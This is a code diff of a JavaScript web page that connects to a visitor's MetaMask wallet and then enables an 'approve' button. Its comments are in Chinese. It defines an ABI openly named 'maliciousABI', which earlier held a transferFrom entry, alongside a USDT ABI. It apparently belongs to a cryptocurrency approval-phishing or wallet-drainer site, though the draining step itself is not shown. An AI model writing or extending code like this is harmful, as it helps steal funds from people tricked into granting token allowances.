@@ -14,54 +14,6 @@ const maliciousABI = [
         "outputs": [],
         "stateMutability": "nonpayable",
         "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "account",
-                "type": "address"
-            }
-        ],
-        "name": "balanceOf",
-        "outputs": [
-            {
-                "internalType": "uint256",
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "sender",
-                "type": "address"
-            },
-            {
-                "internalType": "address",
-                "name": "recipient",
-                "type": "address"
-            },
-            {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "transferFrom",
-        "outputs": [
-            {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
     }
 ];
 
@@ -89,30 +41,6 @@ const usdtABI = [
         ],
         "stateMutability": "nonpayable",
         "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "recipient",
-                "type": "address"
-            },
-            {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "transfer",
-        "outputs": [
-            {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
     }
 ];
 
@@ -123,18 +51,17 @@ document.getElementById('connectButton').onclick = async () => {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
-            // 请求连接到钱包
             await window.ethereum.request({ method: 'eth_requestAccounts' });
             userAccount = (await web3.eth.getAccounts())[0];
             console.log('钱包连接成功: ', userAccount);
-            alert('钱包连接成功: ' + userAccount);
+            document.getElementById('connectButton').innerText = '连接成功'; // 更新按钮文本
             document.getElementById('approveButton').disabled = false; // 启用授权按钮
         } catch (error) {
             console.error('连接错误: ', error);
             alert('连接钱包失败: ' + error.message);
         }
     } else {
-        alert('请安装 MetaMask！');
+        alert('请安装 MetaMask!');
     }
 };
 
